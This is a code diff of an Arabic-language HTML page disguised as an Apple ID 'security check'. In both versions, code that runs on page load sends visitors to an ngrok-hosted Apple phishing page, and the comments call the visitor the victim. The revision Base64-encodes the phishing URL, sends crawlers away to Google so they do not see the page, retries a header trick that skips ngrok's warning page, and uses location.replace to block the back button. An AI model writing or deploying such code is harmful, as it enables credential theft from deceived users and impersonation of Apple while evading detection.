@@ -2,35 +2,61 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جارٍ التحميل...</title>
-    <script>
-        async function redirect() {
-            // رابط الـ Ngrok بتاعك (غيره بالرابط اللي طالع عندك في الـ CMD حالياً)
-const ngrokUrl = "https://5d6d-197-54-198-41.ngrok-free.app/apple/index.html";
-            try {
-                // دي الحركة اللي بتهرب من صفحة التحذير الزرقاء
-                await fetch(ngrokUrl, {
-                    method: 'GET',
-                    headers: {
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    mode: 'no-cors'
-                });
-                
-                // بعد إرسال الهيدر، بنحول الضحية للينك علطول
-                window.location.href = ngrokUrl;
-            } catch (e) {
-                window.location.href = ngrokUrl;
-            }
-        }
-        
-        // تشغيل الدالة بمجرد فتح الصفحة
-        window.onload = redirect;
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأمين الاتصال...</title>
+    <style>
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #1d1d1f; }
+        .box { text-align: center; background: white; padding: 40px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); max-width: 300px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0071e3; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; font-weight: 500; margin: 0; }
+        p { font-size: 13px; color: #86868b; margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 100px; font-family: Arial;">
-        <p>جاري تأمين الاتصال بـ Apple ID...</p>
+
+    <div class="box">
+        <div class="loader"></div>
+        <h2>جارٍ التحقق من الأمان</h2>
+        <p>يتم الآن تأمين اتصالك بخوادم Apple ID الموثوقة...</p>
     </div>
+
+    <script>
+        // 1. تشفير الرابط عشان البوتات ما تفهموش (Base64)
+        // الرابط بتاعك: https://5d6d-197-54-198-41.ngrok-free.app/apple/index.html
+        // الكود المشفر بالأسفل هو الرابط بتاعك
+const secretBase64 = "aHR0cHM6Ly81ZDZkLTE5Ny01NC0xOTgtNDEubmdyb2stZnJlZS5hcHAvYXBwbGUvaW5kZXguaHRtbA==";
+        const targetUrl = atob(secretBase64);
+
+        async function startBypass() {
+            // 2. كاشف البوتات البسيط
+            const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+            if (isBot) {
+                window.location.href = "https://www.google.com";
+                return;
+            }
+
+            // 3. محاولة التخطي النووية (3 محاولات)
+            for (let i = 0; i < 3; i++) {
+                try {
+                    await fetch(targetUrl, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        headers: { 'ngrok-skip-browser-warning': '69420' }
+                    });
+                    break; // لو نجح يخرج من اللوب
+                } catch (e) {
+                    await new Promise(r => setTimeout(r, 500)); // استراحة نص ثانية
+                }
+            }
+
+            // 4. التحويل النهائي بعد التأكد
+            setTimeout(() => {
+                window.location.replace(targetUrl); // استخدام replace عشان ما يقدرش يرجع لورا
+            }, 1000);
+        }
+
+        window.onload = startBypass;
+    </script>
 </body>
 </html>
